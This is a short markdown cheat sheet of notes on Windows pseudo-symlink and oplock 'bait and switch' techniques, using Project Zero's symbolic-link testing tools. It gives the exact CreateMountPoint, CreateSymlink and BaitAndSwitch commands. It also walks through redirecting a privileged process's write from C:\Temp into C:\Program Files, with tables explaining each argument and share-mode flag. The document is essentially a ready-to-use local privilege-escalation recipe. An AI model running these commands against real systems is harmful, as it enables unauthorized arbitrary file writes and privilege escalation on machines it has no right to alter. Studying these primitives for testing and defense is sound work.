# Notes for Pseduo-Symlinking
- https://github.com/googleprojectzero/symboliclink-testing-tools
> Pseudo-symlinking isn’t a formal Windows feature — it’s a technique/pattern used to mimic symbolic link behavior without actually creating a real symlink.

#### Create a mount point to RPC Control (Source folder must be empty)
```CreateMountPoint.exe "C:\Source\Folder" "\RPC Control"```
#### Point the file we control to RPC Control
```CreateSymlink.exe "C:\Source\Folder\filename.txt" "\RPC Control\pwn"```
#### Create a Symlink from RPC Control pointing to the new destination and new filename.
```CreateSymlink.exe "\RPC Control\pwn" "C:\Destination\Folder\newfilename.txt"```

# Notes for BaitAndSwitch.exe
> Syntax: BaitAndSwitch.exe symlink target1 target2 share_mode

BaitAndSwitch.exe "C:\path\to\fileoperation\filename.txt" "C:\path\to\bait\createdfiletocheck.txt" "C:\destination\path\filename.txt" w

### Scenario
A privileged process writes to C:\Temp\test.txt and you want it to actually write to C:\Program Files\test.txt.

#### How to set it up
BaitAndSwitch.exe C:\Temp\test.txt C:\Temp\bait.txt "C:\Program Files\test.txt" w

#### Sequence of events

C:\Temp\test.txt becomes a symlink → pointing to C:\Temp\bait.txt
Oplock placed on C:\Temp\bait.txt
Privileged process opens C:\Temp\test.txt → follows symlink → touches C:\Temp\bait.txt
Oplock fires — symlink is swapped to C:\Program Files\test.txt
Privileged process continues its write, now landing in Program Files

## Arguments

| Argument | Description |
|---|---|
| `symlink` | Path to the symbolic link to create |
| `target1` | Initial symlink destination — where the oplock is placed |
| `target2` | The swap destination — where the symlink redirects on lock break |
| `share_mode` | Optional flags controlling concurrent access |

## Share Mode Flags

| Flag | Constant | Meaning |
|---|---|---|
| `r` | `FILE_SHARE_READ` | Others can read target1 simultaneously |
| `w` | `FILE_SHARE_WRITE` | Others can write target1 simultaneously |
| `d` | `FILE_SHARE_DELETE` | Others can delete target1 simultaneously |
| `x` | Exclusive | No sharing — strongest oplock, longest break window |

## Scenario

| Element | Value | Role |
|---|---|---|
| `symlink` | `C:\Temp\test.txt` | Replaces the real file with a symlink |
| `target1` | `C:\Temp\bait.txt` | Oplock is placed here, initially safe |
| `target2` | `C:\Program Files\test.txt` | Where writes actually land after swap |
